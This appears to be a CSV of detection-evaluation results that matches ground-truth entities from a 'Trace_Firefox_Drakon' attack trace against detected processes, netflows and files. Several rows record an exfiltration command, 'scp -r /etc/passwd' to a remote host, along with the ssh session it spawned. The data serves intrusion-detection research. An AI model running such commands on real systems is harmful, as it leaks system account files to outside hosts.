attack,gt_uuid,status,gt_type,gt_name,our_type,our_name,our_cmdline,type_match
Trace_Firefox_Drakon,39f1230c-ecbf-dcff-a12d-ca98739b15f8,direct,process,/home/admin/scp scp -r /etc/passwd admin@128.55.12.110:./test/,process,scp,scp -r /etc/passwd admin@128.55.12.110:./test/,1
Trace_Firefox_Drakon,b2021835-c0b6-98c3-b306-e9921a6d8457,direct,process,/home/admin/scp scp -r /etc/passwd admin@128.55.12.110:./test/,process,scp,scp -r /etc/passwd admin@128.55.12.110:./test/,1
Trace_Firefox_Drakon,1c003c53-be90-6a91-c19b-7a714d44a864,direct,process,/home/admin/ssh /usr/local/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -l admin -- 128.55.12.110 scp -r -t ./test/,process,ssh,/usr/local/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -l admin -- 128.55.12.110 scp -r -t ./test/,1
Trace_Firefox_Drakon,a972a4c7-d0ee-f2a7-513c-c0200e7a5569,direct,process,/home/admin/firefox firefox,process,firefox,firefox,1
Trace_Firefox_Drakon,3b31261a-403d-2673-940f-36da11884679,direct,process,//sshd /usr/sbin/sshd -D,process,sshd,/usr/sbin/sshd -D,1
Trace_Firefox_Drakon,4e2d8224-3667-4b3a-ec43-8abea4788498,direct,process,/home/admin/firefox firefox,process,firefox,firefox,1
Trace_Firefox_Drakon,e6121325-5c30-5a6f-3916-6e7778795123,direct,netflow,128.55.12.118:52012->35.106.122.76:80,netflow,128.55.12.118:52012->35.106.122.76:80,,1
Trace_Firefox_Drakon,2b7ab6a4-71f3-be5f-e654-b797622837b3,direct,netflow,128.55.12.118:39746->69.155.209.87:80,netflow,128.55.12.118:39746->69.155.209.87:80,,1
Trace_Firefox_Drakon,596e9a1f-6548-796c-2c61-654959591ac2,direct,process,/home/admin/firefox firefox,process,firefox,firefox,1
Trace_Firefox_Drakon,ba54635f-da78-73da-ae1e-32b8089d7af3,direct,file,/usr/local/firefox-54.0.1/build/win32/crashinjectdll,file,/usr/local/firefox-54.0.1/build/win32/crashinjectdll,,1
Trace_Firefox_Drakon,9a823242-2e50-628a-99e9-c2fb259cdabb,direct,process,//sshd /usr/sbin/sshd -D,process,sshd,/usr/sbin/sshd -D,1
Trace_Firefox_Drakon,488431d8-4681-7f12-2d3f-28ab91458ec8,direct,process,/home/admin/du du -sh /bin /boot /data /dev /etc /home /initrd.img /lib /lib64 /lost+found /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var /vmlinuz,process,du,du -sh /bin /boot /data /dev /etc /home /initrd.img /lib /lib64 /lost+found /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var /vmlinuz,1
